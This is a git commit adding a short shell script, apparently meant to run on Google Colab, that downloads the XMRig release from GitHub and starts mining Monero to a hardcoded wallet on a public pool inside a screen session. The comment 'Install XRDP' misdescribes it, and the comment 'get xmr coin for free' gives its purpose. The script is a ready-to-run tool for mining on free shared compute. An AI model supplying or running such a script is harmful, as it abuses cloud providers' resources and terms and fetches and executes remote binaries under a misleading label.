5741e7bdb72c513ba5edd244dcabf8e1242944d6
wklnet <110655027+wklnet@users.noreply.github.com>
2022-09-03 00:20:56 +0800

    Create gcolabs.sh

---
+++ gcolabs.sh
@@ -0,0 +1,13 @@
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.18.0-linux-static-x64.tar.gz
+cd xmrig-6.18.0
+./xmrig -o pool.supportxmr.com:443 -u 87W8JEibzdAWYmLmecWtDUPh9BzANEiZLKHxYQv1oi5XD4SwMZZSfefAGwz1SH2woXLRE3sJsvJpubxk1pAXKcGsC5yYNFt -k --tls --rig-id GC-US
